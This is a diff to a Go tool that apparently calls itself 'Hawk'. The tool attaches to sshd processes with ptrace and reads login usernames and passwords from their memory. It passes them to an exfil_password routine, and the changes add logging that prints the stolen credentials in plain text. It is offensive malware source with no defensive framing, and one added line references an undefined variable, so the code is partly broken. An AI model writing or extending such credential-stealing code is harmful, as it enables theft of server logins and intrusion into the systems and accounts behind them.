@@ -8,12 +8,15 @@ import (
 )
 
 func traceSSHDProcess(pid int) {
+	fmt.Printf("[Hawk] SSH Connection Identified on pid: %d.\n", pid)
+
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
 	}
 	defer func() {
 		syscall.PtraceDetach(pid)
+		fmt.Printf("[Hawk] Detached from pid: %d.\n", pid)
 	}()
 
 	var wstatus syscall.WaitStatus
@@ -32,6 +35,7 @@ func traceSSHDProcess(pid int) {
 			var regs syscall.PtraceRegs
 			err := syscall.PtraceGetRegs(pid, &regs)
 			if err != nil {
+				fmt.Println("PtraceGetRegs:", ptrace_err)
 				syscall.PtraceDetach(pid)
 				return
 			}
@@ -52,7 +56,7 @@ func traceSSHDProcess(pid int) {
 					var password = string(buffer)
 					valid := regexp.MustCompile(`\x00\x00\x00[^\n]*\f$`).MatchString(password)
 					if !valid {
-						fmt.Print("SSH Exfil Hit")
+						fmt.Printf("Username: %q, Password %q\n", username, password)
 						go exfil_password(username, removeFirstFourBytes(password))
 					}
 				}
